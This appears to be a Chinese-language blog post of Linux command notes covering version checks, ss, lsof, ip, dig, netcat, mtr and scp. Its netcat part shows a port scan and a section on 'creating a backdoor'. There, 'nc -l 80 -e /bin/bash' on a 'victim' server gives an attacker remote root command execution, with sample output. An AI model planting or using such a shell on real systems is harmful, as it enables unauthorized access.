class="line"></span><br><span class="line">查看linux发行版及版本号</span><br><span class="line">方法一</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.4.1708 (Core)</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;7 (Core)&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;7&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;</span><br><span class="line">HOME_URL=&quot;https://www.centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;</span><br><span class="line"></span><br><span class="line">方法三</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# lsb_release  -a</span><br><span class="line">LSB Version:	:core-4.1-amd64:core-4.1-noarch</span><br><span class="line">Distributor ID:	CentOS</span><br><span class="line">Description:	CentOS Linux release 7.4.1708 (Core)</span><br><span class="line">Release:	7.4.1708</span><br><span class="line">Codename:	Core</span><br></pre></td></tr></table></figure>
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="网络连接-进程端口"><a href="#网络连接-进程端口" class="headerlink" title="网络连接(进程端口)"></a>网络连接(进程端口)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss：查看网络连接</span><br><span class="line">lsof：查看网络连接</span><br></pre></td></tr></table></figure>
+<h4 id="ss-socket-statistics"><a href="#ss-socket-statistics" class="headerlink" title="ss - socket statistics"></a>ss - socket statistics</h4><p>查看网络连接，代替netstat命令。为什么要代替netstat呢<br>假如想看当前系统有多少连接呢？使用netstat结合awk进行统计。如下脚本，统计了每一种状态的tcp连接数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># netstat -antp | awk &apos;&#123;a[$6]++&#125;END&#123; for(x in a)print x,a[x]&#125;&apos;</span><br><span class="line">LISTEN 41</span><br><span class="line">CLOSE_WAIT 24</span><br><span class="line">ESTABLISHED 150</span><br><span class="line">Foreign 1</span><br><span class="line">TIME_WAIT 92</span><br><span class="line">但如果你在一台有上万连接的服务器上执行这个命令，你可能会等上很长时间。所以，我们有了第二代网络状态统计工具：netstat =&gt; ss</span><br><span class="line"></span><br><span class="line"># ss -s</span><br><span class="line">Total: 191 (kernel 220)</span><br><span class="line">TCP:   5056 (estab 42, closed 5000, orphaned 3, synrecv 0, timewait 5000/0), ports 3469</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>netstat属于net-tools工具集，而ss属于iproute。其命令对应如下，是时候和net-tools说Bye了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用途	net-tools	iproute</span><br><span class="line">统计	netstat	    ss</span><br><span class="line">地址	ifconfig	ip addr</span><br><span class="line">路由	route	    ip route</span><br><span class="line">邻居	arp	        ip neigh</span><br><span class="line">VPN	   iptunnel	   ip tunnel</span><br><span class="line">VLAN   vconfig	   ip link</span><br><span class="line">组播	ipmaddr	    ip maddr</span><br></pre></td></tr></table></figure></p>
+<p>可以查看pid和服务端口的对应关系</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># ss -ptl</span></span><br><span class="line">State      Recv-Q Send-Q                                                                                         Local Address:Port                                                                                                          Peer Address:Port</span><br><span class="line">LISTEN     0      128                                                                                                   *:ssh                                                                                                                      *:*                     users:((<span class="string">"sshd"</span>,pid=1329,fd=3))</span><br><span class="line">LISTEN     0      1                                                                                                  127.0.0.1:32000                                                                                                                    *:*                     users:((<span class="string">"java"</span>,pid=17595,fd=3))</span><br><span class="line">LISTEN     0      128                                                                                                       :::lanmessenger                                                                                                            :::*                     users:((<span class="string">"docker-proxy-cu"</span>,pid=2937,fd=4))</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># ss -ptln|grep 20282</span></span><br><span class="line">LISTEN     0      100          *:20282                    *:*                   users:((<span class="string">"java"</span>,pid=17470,fd=21))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>ss</code> 真正耀眼的地方是其内置的过滤能力</p>
+</blockquote>
+<p>显示所有的http连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss  dport = :http</span><br></pre></td></tr></table></figure></p>
+<p>只想看已建立的 socket（排除了 <em>listening</em> 和 <em>closed</em> ）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ss state connected sport = :ssh</span><br><span class="line">Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540</span><br></pre></td></tr></table></figure>
+<p>只想和某个ip的所有连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ss dst 10.66.224.130</span><br><span class="line">ss dst 10.66.224.130:http</span><br><span class="line">ss dst 10.66.224.130:smtp</span><br><span class="line">ss dst 10.66.224.130:443</span><br></pre></td></tr></table></figure></p>
+<p>列出指定的 host 或者 ip 段。例如，列出到达 74.125.0.0/16 子网的连接，这个子网属于 Google</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ss state all dst 74.125.0.0/16</span><br><span class="line">Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:33616                   74.125.142.189:https</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:42034                    74.125.70.189:https</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:57408                   74.125.202.189:https</span><br></pre></td></tr></table></figure>
+<h4 id="lsof-list-open-files"><a href="#lsof-list-open-files" class="headerlink" title="lsof - list open files"></a>lsof - list open files</h4><blockquote>
+<p>非常实用的系统级的监控、诊断工具</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">查看指定端口有哪些进程在使用 lsof -i:PORT（lsof -i 列出所有的打开的网络连接） </span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># lsof -i:32000</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">wrapper  1105 root    6u  IPv4 53752676      0t0  TCP localhost:32000-&gt;localhost:31001 (ESTABLISHED)</span><br><span class="line">java    17595 root    3u  IPv4 53752648      0t0  TCP localhost:32000 (LISTEN)</span><br><span class="line">java    17595 root   28u  IPv4 53752674      0t0  TCP localhost:31001-&gt;localhost:32000 (ESTABLISHED)</span><br><span class="line"></span><br><span class="line">查看指定进程pid打开的文件 losf -p pid</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># lsof -p 17595</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE             DEVICE  SIZE/OFF     NODE NAME</span><br><span class="line">java    17595 root  mem    REG              253,1   1078737  1313486 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-core-4.2.4.RELEASE.jar</span><br><span class="line">java    17595 root  mem    REG              253,1   1097552  1313482 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-context-4.2.4.RELEASE.jar</span><br><span class="line">java    17595 root  mem    REG              253,1    731512  1313485 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-beans-4.2.4.RELEASE.jar</span><br><span class="line"></span><br><span class="line">列出被某个进程打开所有的网络文件</span><br><span class="line">lsof -i -a -p 234</span><br><span class="line"></span><br><span class="line">查看指定主机有哪些进程在使用</span><br><span class="line">lsof -i@192.168.1.91</span><br><span class="line"></span><br><span class="line">查看指定用戶打开的文件</span><br><span class="line">lsof -u messagebus</span><br><span class="line"></span><br><span class="line">查看指定程序打开的文件</span><br><span class="line">lsof -c firefox</span><br><span class="line"></span><br><span class="line">查看被删除的文件。有些删了的文件，但是进程没reload，那些空间还是占用的</span><br><span class="line">lsof|grep -i delete</span><br></pre></td></tr></table></figure>
+<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip：</span><br><span class="line">ifconfig：</span><br><span class="line">dig：</span><br></pre></td></tr></table></figure>
+<h4 id="ip-show-manipulate-routing-devices-policy-routing-and-tunnels"><a href="#ip-show-manipulate-routing-devices-policy-routing-and-tunnels" class="headerlink" title="ip - show / manipulate routing, devices, policy routing and tunnels"></a>ip - show / manipulate routing, devices, policy routing and tunnels</h4><blockquote>
+<p>ip 意在取代ifconfig</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# ip addr|grep eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    inet 172.16.68.43/20 brd 172.16.79.255 scope global dynamic eth0</span><br></pre></td></tr></table></figure>
+<h4 id="ifconfig-configure-a-network-interface"><a href="#ifconfig-configure-a-network-interface" class="headerlink" title="ifconfig - configure a network interface"></a>ifconfig - configure a network interface</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg /]# ifconfig |grep inet</span><br><span class="line">        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255</span><br><span class="line">        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet 172.16.68.43  netmask 255.255.240.0  broadcast 172.16.79.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br></pre></td></tr></table></figure>
+<h4 id="dig-DNS-lookup-utility"><a href="#dig-DNS-lookup-utility" class="headerlink" title="dig - DNS lookup utility"></a>dig - DNS lookup utility</h4><blockquote>
+<p>DNS查找工具</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dig 从DNS域名服务器查询指定主机信息</span><br><span class="line">dig baidu.com</span><br><span class="line"></span><br><span class="line">从指定的 DNS 服务器上查询</span><br><span class="line">dig @8.8.8.8 abc.filterinto.com</span><br><span class="line"></span><br><span class="line">跟踪整个查询过程</span><br><span class="line">如果你好奇 dig 命令执行查询时都经历了哪些过程，你可以尝试使用 +trace 选项。它会输出从根域到最终结果的所有信息：</span><br><span class="line">$ dig +trace abc.filterinto.com</span><br></pre></td></tr></table></figure>
+<h3 id="网络调试-网络诊断"><a href="#网络调试-网络诊断" class="headerlink" title="网络调试(网络诊断)"></a>网络调试(网络诊断)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wireshark：</span><br><span class="line">nc：</span><br><span class="line">mtr：</span><br></pre></td></tr></table></figure>
+<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><blockquote>
+<p>强大的可视化工具 一定要会用 todo</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark</span><br></pre></td></tr></table></figure>
+<h4 id="nc-netcat-Concatenate-and-redirect-sockets"><a href="#nc-netcat-Concatenate-and-redirect-sockets" class="headerlink" title="nc - netcat - Concatenate and redirect sockets"></a>nc - netcat - Concatenate and redirect sockets</h4><blockquote>
+<p>既可以网络调试又数据传输, 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀</p>
+</blockquote>
+<h5 id="网络调试"><a href="#网络调试" class="headerlink" title="网络调试"></a>网络调试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todo</span><br></pre></td></tr></table></figure>
+<h5 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h5><p>使用netcat实现聊天<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">47.98.189.37机器，监听80端口(注意:我这里是aliyun服务器，他的安全策略是只开放了80等端口，你使用其他端口可能无法实现聊天，这是因为阿里云的安全策略控制的，你需要配置你使用的端口)</span><br><span class="line">接收端启动监听</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80</span><br><span class="line">ff</span><br><span class="line">dfgdfg</span><br><span class="line"></span><br><span class="line">发送端(mac机器)连接47.98.189.37机器的80端口</span><br><span class="line">[skyler@mac ~]# nc 47.98.189.37 80</span><br><span class="line">ff</span><br><span class="line">dfgdfg</span><br><span class="line"></span><br><span class="line">输入ff、dfgdfg可以看到消息已经相互传递了。断开时需要手动Ctrl + c</span><br></pre></td></tr></table></figure></p>
+<p>使用netcat实现文件传输<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 &gt; test.sh</span><br><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# ll</span><br><span class="line">-rw-r--r-- 1 root root     0 10月 29 10:37 test.sh</span><br><span class="line"></span><br><span class="line">[skyler@mac ~]# nc 47.98.189.37 80 &lt; test.sh</span><br><span class="line">传输完成，连接自动断开</span><br></pre></td></tr></table></figure></p>
+<h5 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">实例：nc -v -z -w2 192.168.31.164 1-100</span><br><span class="line"></span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-z：使用0输入/输出模式，只在扫描通信端口时使用。</span><br><span class="line">-w2：设置等待连线的时间为2s；</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -v -z -w2 192.168.31.164 38322</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure>
+<h5 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 端口转发，作为代理，</span><br><span class="line">2. 创建后门(也叫反弹shell)</span><br></pre></td></tr></table></figure>
+<h6 id="端口转发，作为代理"><a href="#端口转发，作为代理" class="headerlink" title="端口转发，作为代理"></a>端口转发，作为代理</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">端口转发</span><br><span class="line">我们通过选项 -c 来用 nc 进行端口转发，实现端口转发的语法为：</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -u -l  80 -c  &apos;ncat -u -l 8080&apos;</span><br><span class="line"></span><br><span class="line">作为代理</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 | nc 192.168.1.200 80</span><br><span class="line">所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</span><br><span class="line"></span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# mkfifo 2way</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 0&lt;2way | nc 192.168.1.200 80 1&gt;2way</span><br><span class="line">现在你可以通过 nc 代理来收发数据了。</span><br></pre></td></tr></table></figure>
+<h6 id="创建后门-也叫反弹shell"><a href="#创建后门-也叫反弹shell" class="headerlink" title="创建后门(也叫反弹shell)"></a>创建后门(也叫反弹shell)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">受害者机器主动打开监听。-e为执行被给的命令，“nc -l 80 -e /bin/bash”含义为执行连接端输入的命令</span><br><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 -e /bin/bash</span><br><span class="line"></span><br><span class="line">攻击端(连接端)连接受害者机器80端口，然后输入命令获取受害者机器的信息，从而实现攻击</span><br><span class="line">[skyler@mac ~]# nc 47.98.189.37 80</span><br><span class="line">w</span><br><span class="line"> 11:21:25 up 493 days, 23:11,  1 user,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    210.12.157.87    10:13   13.00s  0.04s  0.00s w</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">uname -a</span><br><span class="line">Linux izbp10lqlgy2g31s41bt94z 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<h5 id="监测工具"><a href="#监测工具" class="headerlink" title="监测工具"></a>监测工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动监听。等待连接端连接</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80</span><br></pre></td></tr></table></figure>
+<h4 id="mtr-a-network-diagnostic-tool"><a href="#mtr-a-network-diagnostic-tool" class="headerlink" title="mtr - a network diagnostic tool"></a>mtr - a network diagnostic tool</h4><p>是一款更好的网络诊断、网络调试跟踪工具，集成了traceroute、ping、nslookup的判断主机的网络连通性功能，用于诊断网络状态非常有用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# mtr www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/23/linux常用命令草集/image-20191019225352819.png" alt="image-20191019225352819"></p>
+<p><a href="http://einverne.github.io/post/2017/11/mtr-usage.html" target="_blank" rel="noopener">http://einverne.github.io/post/2017/11/mtr-usage.html</a></p>
+<h3 id="网络带宽"><a href="#网络带宽" class="headerlink" title="网络带宽"></a>网络带宽</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nethogs: 按进程查看流量占用</span><br><span class="line">iptraf: 按连接/端口查看流量</span><br><span class="line">ifstat: 按设备查看流量</span><br><span class="line">iftop: 按套接字看连接带宽流量占用</span><br><span class="line">ethtool: 诊断工具</span><br><span class="line">tcpdump: 抓包工具</span><br><span class="line">ss: 连接查看工具</span><br></pre></td></tr></table></figure>
+<h3 id="网络传输-数据"><a href="#网络传输-数据" class="headerlink" title="网络传输(数据)"></a>网络传输(数据)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp：不同机器上远程拷贝文件</span><br><span class="line">nc：数据传输</span><br></pre></td></tr></table></figure>
+<h4 id="scp-secure-copy"><a href="#scp-secure-copy" class="headerlink" title="scp - secure copy"></a>scp - secure copy</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。</span><br><span class="line">可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。</span><br><span class="line">另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。</span><br><span class="line">虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用</span><br></pre></td></tr></table></figure>
+<h5 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h5><blockquote>
+<p>scp [参数] [原路径] [目标路径]</p>
+</blockquote>
+<h5 id="命令功能"><a href="#命令功能" class="headerlink" title="命令功能"></a>命令功能</h5><p>scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。linux的scp命令可以在linux服务器之间复制文件和目录。</p>
+<h5 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-1 强制scp命令使用协议ssh1 </span><br><span class="line">-2 强制scp命令使用协议ssh2 </span><br><span class="line">-4 强制scp命令只使用IPv4寻址 </span><br><span class="line">-6 强制scp命令只使用IPv6寻址 </span><br><span class="line">-B 使用批处理模式（传输过程中不询问传输口令或短语） </span><br><span class="line">-C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） </span><br><span class="line">-p 保留原文件的修改时间，访问时间和访问权限。 </span><br><span class="line">-q 不显示传输进度条。 </span><br><span class="line">-r 递归复制整个目录。 </span><br><span class="line">-v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 </span><br><span class="line">-c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 </span><br><span class="line">-F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 </span><br><span class="line">-i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。  </span><br><span class="line">-l limit 限定用户所能使用的带宽，以Kbit/s为单位。  </span><br><span class="line">-o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， </span><br><span class="line">-P port 注意是大写的P, port是指定数据传输用到的端口号 </span><br><span class="line">-S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。</span><br></pre></td></tr></table></figure>
+<h5 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h5><h6 id="从本地服务器上传到远程服务器"><a href="#从本地服务器上传到远程服务器" class="headerlink" title="从本地服务器上传到远程服务器"></a>从本地服务器上传到远程服务器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(1) 上传文件</span><br><span class="line">命令格式： </span><br><span class="line">scp local_file remote_username@remote_ip:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_username@remote_ip:remote_file </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_ip:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp local_file remote_ip:remote_file </span><br><span class="line"></span><br><span class="line">第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名 </span><br><span class="line">第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 </span><br><span class="line"></span><br><span class="line">实例：上传本地文件到远程机器指定目录</span><br><span class="line">scp /opt/soft/nginx-0.5.38.tar.gz root@10.80.100.20:/opt/soft/scptest</span><br><span class="line">说明</span><br><span class="line">上传本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器10.80.100.20的opt/soft/scptest目录</span><br><span class="line"></span><br><span class="line">(2) 上传目录</span><br><span class="line">命令格式： </span><br><span class="line">scp -r local_folder remote_username@remote_ip:remote_folder </span><br><span class="line">或者 </span><br><span class="line">scp -r local_folder remote_ip:remote_folder </span><br><span class="line">第1个指定了用户名，命令执行后需要输入用户密码； </span><br><span class="line">第2个没有指定用户名，命令执行后需要输入用户名和密码；</span><br><span class="line"></span><br><span class="line">实例：上传本地目录到远程机器指定目录</span><br><span class="line">scp -r /opt/soft/mongodb root@10.80.100.20:/opt/soft/scptest</span><br><span class="line">说明</span><br><span class="line">上传本地opt/soft/目录到远程机器10.80.100.20的opt/soft/scptest目录</span><br></pre></td></tr></table></figure>
